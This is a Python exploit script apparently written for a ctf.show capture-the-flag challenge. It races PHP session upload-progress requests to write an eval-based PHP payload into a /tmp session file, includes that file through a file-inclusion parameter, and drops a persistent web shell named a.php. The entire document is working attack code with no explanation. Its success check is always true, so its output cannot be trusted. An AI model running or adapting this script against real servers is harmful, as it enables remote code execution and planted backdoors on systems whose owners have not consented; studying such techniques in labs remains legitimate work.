import requests
import io
import threading

url = "http://a639b370-2293-4306-86d1-a88a38ceae39.challenge.ctf.show/"

sessionid = "na0h"

def write(session):
    filebytes = io.BytesIO(b'a' * 1024 * 50)
    while True:
        resp = session.post(url,
                            data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST[1]);?>'},
                            files={'file': ('na0h.png', filebytes)},
                            cookies={'PHPSESSID': sessionid})
        print("[*]writing...")


def read(session):
    while True:
        resp = session.post(url+'?f=/tmp/sess_'+sessionid,
                            data={'1': '''file_put_contents('a.php','<?php eval($_POST[1]);?>');'''},
                            cookies={'PHPSESSID': sessionid})
        if 'na0h.png' or 'offset: 1' in resp.text:
            print(resp.text)
            event.clear()
        else:
            print("[*]status:"+str(resp.status_code))

if __name__ == "__main__":
    event = threading.Event()
    with requests.session() as session:
        for i in range(5):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(5):
            threading.Thread(target=read, args=(session,)).start()
    event.set()